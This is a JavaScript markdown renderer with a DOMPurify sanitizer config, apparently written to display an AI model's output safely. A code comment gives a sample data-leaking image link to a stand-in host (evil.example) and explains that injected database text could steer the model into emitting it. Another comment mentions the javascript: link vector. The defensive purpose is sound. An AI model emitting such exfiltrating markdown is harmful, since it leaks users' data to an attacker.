import { Marked } from "marked";
import DOMPurify from 'dompurify';
import hljs from 'highlight.js';

function escapeHtml(text) {
    return text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

const marked = new Marked();

marked.use({
    renderer: {
        html({ text }) {
            return escapeHtml(text);
        },
        // Never load images. The model's output can be steered by text it
        // reads from the database, and an image URL is fetched without a
        // click — so `![x](https://evil.example/?d=<data>)` would leak data.
        // Show the image as an ordinary link instead.
        image({ href, text }) {
            const label = text || href || '';
            return `<a href="${escapeHtml(href || '')}">${escapeHtml(label)}</a>`;
        },
        code({ text, lang }) {
            const validLang = lang && hljs.getLanguage(lang) ? lang : 'plaintext';
            const highlighted = hljs.highlight(text, { language: validLang }).value;
            const displayLang = escapeHtml(lang || 'text');
            const encodedText = encodeURIComponent(text);
            return `<div class="md-code-block">`
                + `<div class="md-code-header">`
                + `<span class="md-code-lang">${displayLang}</span>`
                + `<button class="copy-code-btn" data-code="${encodedText}">Copy</button>`
                + `</div>`
                + `<pre><code class="hljs language-${validLang}">${highlighted}</code></pre>`
                + `</div>`;
        },
    },
    breaks: true,
    gfm: true,
});

/*
 * Sanitizer
 *
 * marked does not sanitize its output: `[x](javascript:...)` becomes a live
 * javascript: link. Everything it produces goes through DOMPurify with an
 * explicit allowlist covering only what the renderer above can emit.
 */
const SANITIZE_CONFIG = {
    ALLOWED_TAGS: [
        'p', 'br', 'hr', 'strong', 'em', 'del', 'code', 'pre', 'blockquote',
        'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
        'table', 'thead', 'tbody', 'tr', 'th', 'td',
        'a', 'span', 'div', 'button', 'input',
    ],
    ALLOWED_ATTR: [
        'href', 'title', 'class', 'align', 'start',
        'data-code',                    // copy button payload
        'type', 'checked', 'disabled',  // GFM task-list checkboxes
    ],
    ALLOW_DATA_ATTR: false,
    // Absolute http(s) and mailto links only — no javascript:, data:, etc.
    ALLOWED_URI_REGEXP: /^(?:https?|mailto):/i,
    // DOMPurify applies the URI pattern above to every attribute value that
    // isn't marked URI-safe, so the non-URL attributes must be listed here
    // or they are stripped.
    ADD_URI_SAFE_ATTR: ['data-code', 'type', 'align', 'start'],
};

DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    if (node.tagName === 'A') {
        // Open in a new tab without handing the page a reference to us or
        // leaking the Quermy URL as referrer.
        node.setAttribute('target', '_blank');
        node.setAttribute('rel', 'noopener noreferrer nofollow');
    }
    if (node.tagName === 'INPUT' && node.getAttribute('type') !== 'checkbox') {
        node.remove();
    }
});

/** @param {string} markdown @returns {string} sanitized HTML */
export function parse(markdown) {
    if (!markdown) return '';
    return DOMPurify.sanitize(String(marked.parse(markdown)), SANITIZE_CONFIG);
}
